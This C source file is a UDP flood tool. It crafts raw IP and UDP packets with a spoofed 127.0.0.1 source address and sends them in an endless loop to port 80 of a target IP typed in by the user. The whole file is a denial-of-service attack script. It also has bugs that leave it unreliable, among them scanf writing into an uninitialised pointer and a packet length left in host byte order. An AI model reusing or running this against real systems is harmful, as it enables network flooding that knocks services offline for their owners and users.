#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

// Pseudo header needed for UDP checksum calculation
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};

// Compute checksum
unsigned short checksum(void *data, int len) {
    unsigned short *buf = data;
    unsigned int sum = 0;
    unsigned short result;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;

    return result;
}

// Create the IP header
void fill_ip_header(struct iphdr *iph, const char *src_ip, const char *dst_ip) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 8; // Extra 8 bytes for UDP data
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0; // Leave checksum 0 now, filled later
    iph->saddr = inet_addr(src_ip);
    iph->daddr = inet_addr(dst_ip);

    iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));
}

// Create the UDP header
void fill_udp_header(struct udphdr *udph, u_int16_t src_port, u_int16_t dst_port, u_int16_t data_len) {
    udph->source = htons(src_port);
    udph->dest = htons(dst_port);
    udph->len = htons(sizeof(struct udphdr) + data_len);
    udph->check = 0; // Leave checksum 0 now, filled later
}

// Calculate UDP checksum
unsigned short calculate_udp_checksum(struct iphdr *iph, struct udphdr *udph, char *data, u_int16_t data_len) {
    struct pseudo_header psh;
    char pseudogram[4096];

    // Fill the pseudo header
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(sizeof(struct udphdr) + data_len);

    // Prepare the pseudogram
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr));
    memcpy(pseudogram + sizeof(struct pseudo_header) + sizeof(struct udphdr), data, data_len);

    return checksum((unsigned short *)pseudogram, sizeof(struct pseudo_header) + sizeof(struct udphdr) + data_len);
}

void flood(const char *ipDestination) {
    while (1)
    {
        int sock;
        struct sockaddr_in dest;
        struct iphdr iph;
        struct udphdr udph;
        char packet[4096];
        char data[] = "Hello, UDP!"; // Data to send

        // Create a raw socket
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) {
            perror("Socket creation failed");
        }

        // Zero out the packet buffer
        memset(packet, 0, 4096);

        // Fill IP header
        fill_ip_header(&iph, "127.0.0.1", ipDestination);

        // Fill UDP header
        fill_udp_header(&udph, 1234, 80, sizeof(data) - 1);

        // Calculate and set UDP checksum
        udph.check = calculate_udp_checksum(&iph, &udph, data, sizeof(data) - 1);

        // Copy IP and UDP headers and data into packet
        memcpy(packet, &iph, sizeof(struct iphdr));
        memcpy(packet + sizeof(struct iphdr), &udph, sizeof(struct udphdr));
        memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), data, sizeof(data) - 1);

        // Destination address
        dest.sin_family = AF_INET;
        dest.sin_port = htons(80);
        dest.sin_addr.s_addr = iph.daddr;

        // Send the packet
        if (sendto(sock, packet, iph.tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("Send failed");
            close(sock);
        }

        printf("Packet sent successfully\n");

        // Close the socket
        close(sock);
    }
}

int main() {
    char *targetIP;

    printf("Enter IP Address Target >> "); scanf("%c", targetIP);

    flood(targetIP);

    return 0;
}
// gcc -o send_raw_udp send_raw_udp.c